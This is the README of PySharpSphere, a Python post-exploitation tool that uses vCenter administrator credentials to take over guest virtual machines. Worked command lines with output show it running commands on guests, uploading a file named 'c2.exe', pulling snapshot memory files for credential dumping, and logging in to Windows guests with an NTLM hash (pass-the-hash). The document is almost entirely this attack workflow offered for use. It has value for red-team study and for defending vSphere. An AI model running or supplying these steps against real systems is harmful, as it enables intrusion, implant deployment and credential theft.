PySharpSphere
============

Inspired by [SharpSphere](https://github.com/JamesCooteUK/SharpSphere), just another python version.

### Installation
```bash
python3 setup.py install
```

### Features
- Support control both Linux and Windows system of virtual machines
- Execute commands, upload files and dump memory on target guest OS
- Use NTLM token to execute commands on guest Windows system


### SharpSphere Guide
- https://jamescoote.co.uk/introducing-sharpsphere/
- https://jamescoote.co.uk/Dumping-LSASS-with-SharpShere/


### PySharpSphere Usage
```bash
usage: pySharpSphere [-h] [-H HOST] [-P PORT] [-u USER] [-p PASSWORD]
                     {list,execute,upload,dump} ...

positional arguments:
  {list,execute,upload,dump}
                        sub-command
    list                list virtual machines
    execute             execute command on target machine
    upload              upload file to target machine
    dump                dump memory of target machine

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST  vCenter Server host
  -P PORT, --port PORT  vCenter Server port
  -u USER, --username USER
                        vCenter Server username
  -p PASSWORD, --password PASSWORD
                        vCenter Server password
```

**0. List virtual machines**
```bash
$ pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password list
[*] Retrieve virtual machines list ...
DataCenter    MoID     Name                           Power    OS                                         Tools         IP
------------  -------  -----------------------------  -------  -----------------------------------------  ------------  --------------
Datacenter    vm-1015  Windows Server 2012 (VC67)     Off      Microsoft Windows Server 2012 (64-bit)     Current
Datacenter    vm-1030  VMware vCenter Server 7.0U2b   On       Other 3.x or later Linux (64-bit)          Unmanaged     192.168.100.49
Datacenter    vm-1017  VMware vCenter Server 6.7U3l   Off      Other 3.x or later Linux (64-bit)          Unmanaged
Datacenter    vm-1020  Operation Machine (Windows 7)  On       Microsoft Windows 7 (64-bit)               Current       192.168.100.2
```

**1. Execute commands on guest OS**
```bash
$ pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password execute -t vm-1020 --guest-user administrator --guest-pass guestpassword -c whoami
[*] Execute command on target virtual machine ...
[*] Retrieve virtual machines list ...
[*] Target OS is Windows, using C:\Windows\system32\cmd.exe to execute command ...
[+] Process start successfully with PID 1200
[*] Program exited, retrieving output ...
[*] Command output:
operation-machi\administrator
```

**2. Upload file to target virtual machine**
```bash
$ pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password upload -t vm-1020 --guest-user administrator --guest-pass guestpassword --source /tmp/test.exe --dest C:\\c2.exe
[*] Retrieve virtual machines list ...
[*] Uploading file to VM 'vim.VirtualMachine:vm-1020' ...
[*] Sending file data ...
[+] Uploaded file to C:\c2.exe successfully
```

**3. Dump memory of guest OS**
```bash
$ pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password dump -t vm-1020
[*] Retrieve virtual machines list ...
[*] Finding snapshot on target machine vm-1020
[+] Found exists snapshot!
[*] Finding snapshot files ...
[*] Downloading .vmsn file ...
[+] Downloaded successfully: Ubuntu-Snapshot1.vmsn
[*] Downloading .vmem file ...
[+] Downloaded successfully: Ubuntu-Snapshot1.vmem
```

**4. Execute commands on guest OS using NTLM**
```bash
$ pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password execute -t vm-1015 --guest-user administrator --guest-ntlm ea41383fa39c20f186cbcdc0ac234417 -c whoami
[*] Execute command on target virtual machine ...
[*] Retrieve virtual machines list ...
[*] Target OS is Windows, using C:\Windows\system32\cmd.exe to execute command ...
[*] Starting NTLM authentication ...
[+] Process start successfully with PID 2624
[*] Program exited, retrieving output ...
[*] Command output:
win-i1el8084mf0\administrator
```